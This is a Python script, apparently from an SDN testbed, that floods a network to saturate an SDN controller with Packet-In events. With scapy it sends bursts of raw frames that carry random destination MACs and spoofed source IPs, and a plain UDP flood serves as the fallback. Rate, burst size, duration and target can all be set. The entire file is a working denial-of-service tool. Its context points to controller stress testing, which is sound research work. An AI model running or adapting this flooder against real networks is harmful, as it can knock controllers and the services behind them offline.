#!/usr/bin/env python3
"""
Packet-In stress generator.

Methods:
1. scapy: sends raw Ethernet/IP/UDP frames with random destination MACs.
   This is the best method for Packet-In saturation because each packet is
   likely to miss the switch table and reach the SDN controller.

2. udp: fallback standard-library UDP sender.
   This is less reliable for Packet-In saturation because ARP and learned
   switch flows can reduce controller involvement.
"""

import argparse
import csv
import os
import random
import shlex
import socket
import time


def load_config():
    config_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "config.sh")
    config = {}
    with open(config_path, encoding="utf-8") as fh:
        for raw_line in fh:
            line = raw_line.strip()
            if not line or line.startswith("#") or "=" not in line:
                continue
            parts = shlex.split(line, comments=True, posix=True)
            if parts and "=" in parts[0]:
                key, value = parts[0].split("=", 1)
                if key.startswith("DEFAULT_"):
                    config[key] = value
    return config


CONFIG = load_config()
DEFAULT_ATTACK_DURATION_SECONDS = float(CONFIG["DEFAULT_PACKETIN_ATTACK_DURATION"])
DEFAULT_ATTACK_LOG = CONFIG["DEFAULT_ATTACK_LOG"]
DEFAULT_ATTACK_METHOD = CONFIG["DEFAULT_ATTACK_METHOD"]
DEFAULT_ATTACK_RATE_PPS = float(CONFIG["DEFAULT_ATTACK_RATE"])
DEFAULT_ATTACK_TARGET_PREFIX = CONFIG["DEFAULT_ATTACK_TARGET_PREFIX"]
DEFAULT_BURST_SIZE = int(CONFIG["DEFAULT_BURST_SIZE"])
DEFAULT_MININET_ATTACK_IFACE = CONFIG["DEFAULT_MININET_ATTACK_IFACE"]
DEFAULT_PACKET_SIZE_BYTES = int(CONFIG["DEFAULT_PACKET_SIZE"])
DEFAULT_RANDOM_HOST_END = int(CONFIG["DEFAULT_RANDOM_HOST_END"])
DEFAULT_RANDOM_HOST_START = int(CONFIG["DEFAULT_RANDOM_HOST_START"])


def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def random_ip(
    prefix=DEFAULT_ATTACK_TARGET_PREFIX,
    start=DEFAULT_RANDOM_HOST_START,
    end=DEFAULT_RANDOM_HOST_END,
):
    return "{}{}".format(prefix, random.randint(start, end))


def write_log(path, rows):
    if not path:
        return
    with open(path, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "total_packets_sent"])
        writer.writerows(rows)


def run_scapy(args):
    try:
        from scapy.all import Ether, IP, UDP, Raw, get_if_hwaddr, sendp
    except ImportError:
        raise SystemExit(
            "Scapy is not installed. Install with: sudo apt-get install python3-scapy"
        )

    src_mac = get_if_hwaddr(args.iface)
    payload = b"A" * max(1, args.size)
    burst_size = args.burst_size
    if burst_size <= 0:
        burst_size = max(1, min(100, int(max(args.rate, 1) / 100)))
    end_time = time.time() + args.duration
    start_perf = time.perf_counter()

    sent = 0
    rows = []
    last_log = time.time()

    def build_packet():
        dst_ip = args.target or random_ip(args.target_prefix, args.start_host, args.end_host)
        return (
            Ether(src=src_mac, dst=random_mac()) /
            IP(src=random_ip(args.target_prefix, args.start_host, args.end_host), dst=dst_ip) /
            UDP(sport=random.randint(1024, 65535), dport=random.randint(1024, 65535)) /
            Raw(payload)
        )

    while time.time() < end_time:
        packets = [build_packet() for _ in range(burst_size)]
        sendp(packets, iface=args.iface, verbose=False)
        sent += len(packets)

        now = time.time()
        if now - last_log >= 1.0:
            rows.append((now, sent))
            last_log = now

        if args.rate > 0:
            target_elapsed = sent / args.rate
            sleep_for = target_elapsed - (time.perf_counter() - start_perf)
            if sleep_for > 0:
                time.sleep(sleep_for)

    write_log(args.log, rows)
    elapsed = max(time.perf_counter() - start_perf, 0.000001)
    print(
        "packetin_attack method=scapy requested_rate_pps={} achieved_rate_pps={:.2f} sent_packets={}".format(
            args.rate,
            sent / elapsed,
            sent,
        ),
        flush=True,
    )


def run_udp(args):
    payload = b"A" * max(1, args.size)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    delay = 0 if args.rate <= 0 else 1.0 / args.rate
    end_time = time.time() + args.duration

    sent = 0
    rows = []
    last_log = time.time()

    while time.time() < end_time:
        dst = args.target or random_ip(args.target_prefix, args.start_host, args.end_host)
        port = random.randint(1024, 65535)
        try:
            sock.sendto(payload, (dst, port))
            sent += 1
        except OSError:
            pass

        now = time.time()
        if now - last_log >= 1.0:
            rows.append((now, sent))
            last_log = now

        if delay > 0:
            time.sleep(delay)

    sock.close()
    write_log(args.log, rows)
    print("packetin_attack method=udp sent_packets={}".format(sent), flush=True)


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--method", choices=["scapy", "udp"], default=DEFAULT_ATTACK_METHOD)
    parser.add_argument("--iface", default=DEFAULT_MININET_ATTACK_IFACE, help="Interface to send raw frames from")
    parser.add_argument("--target", default=None)
    parser.add_argument("--target-prefix", default=DEFAULT_ATTACK_TARGET_PREFIX)
    parser.add_argument("--start-host", type=int, default=DEFAULT_RANDOM_HOST_START)
    parser.add_argument("--end-host", type=int, default=DEFAULT_RANDOM_HOST_END)
    parser.add_argument("--rate", type=float, default=DEFAULT_ATTACK_RATE_PPS)
    parser.add_argument("--burst-size", type=int, default=DEFAULT_BURST_SIZE, help="Packets per Scapy sendp call; 0 auto-tunes from rate")
    parser.add_argument("--size", type=int, default=DEFAULT_PACKET_SIZE_BYTES)
    parser.add_argument("--duration", type=float, default=DEFAULT_ATTACK_DURATION_SECONDS)
    parser.add_argument("--log", default=DEFAULT_ATTACK_LOG)
    return parser.parse_args()


def main():
    args = parse_args()
    if args.method == "scapy":
        run_scapy(args)
    else:
        run_udp(args)


if __name__ == "__main__":
    main()
